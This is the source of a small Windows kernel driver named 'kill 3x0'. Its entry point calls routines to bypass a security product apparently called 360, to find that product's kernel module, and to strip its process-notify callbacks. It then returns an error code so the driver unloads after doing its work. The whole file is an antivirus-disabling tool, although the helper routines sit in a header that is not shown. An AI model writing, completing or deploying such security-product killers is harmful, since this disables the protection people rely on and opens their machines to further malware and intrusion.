/// kill 3x0
/// 学(抄)习(袭)、总结自各种资料

extern "C" {
#include <ntifs.h>
}
#include "Kill_3X0.hpp"


namespace SuperModule {
	LONG OneKeyBypass3X0() {
		rush_duck_pass::Pass3X0();
		if (rush_duck_enum::Find3X0Module()) {
			rush_duck_enum::RemoveProcessNotify();
		}
		return STATUS_NOT_SUPPORTED;
	}
}

EXTERN_C NTSTATUS DriverEntry(PDRIVER_OBJECT pDri, PUNICODE_STRING regPath) {
	// pDri->DriverUnload = (PDRIVER_UNLOAD)DriverUnload;
	return  SuperModule::OneKeyBypass3X0();
}